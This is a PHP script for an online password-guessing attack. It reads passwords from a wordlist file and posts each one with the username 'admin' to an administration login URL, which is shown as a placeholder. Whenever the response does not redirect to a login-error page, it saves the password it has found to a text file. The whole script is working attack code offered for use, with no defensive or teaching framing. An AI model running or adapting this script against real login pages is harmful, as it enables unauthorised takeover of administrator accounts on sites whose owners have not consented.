<?php
require_once ("bruteForceNc.php");
require_once ("configBrute.php");
use Attack\bruteForce,configBrute\config;

$attackUrl="https://www.xxx.com/administration/login";
$controlErrorUrl='?login-password-error';
$ba= new bruteForce();
$file = fopen(config::bruteforceFile(),'r');
while(!feof($file)) {
    $line = fgets($file);
    $postDate=array(
        "username"=>"admin",
        "password"=>"$line",
        "btn-login"=>"",
    );
    echo "$line";
    if($ba->bruteForce($attackUrl,$postDate,$controlErrorUrl)){
        file_put_contents('PasswordConfirm.txt',$line);
        echo "Password is found  : $line";
       die();

    }
    $data=$ba->bruteForce($attackUrl,$postDate,$controlErrorUrl);
    unset($postDate);
    unset($data);
}

fclose($file);
?>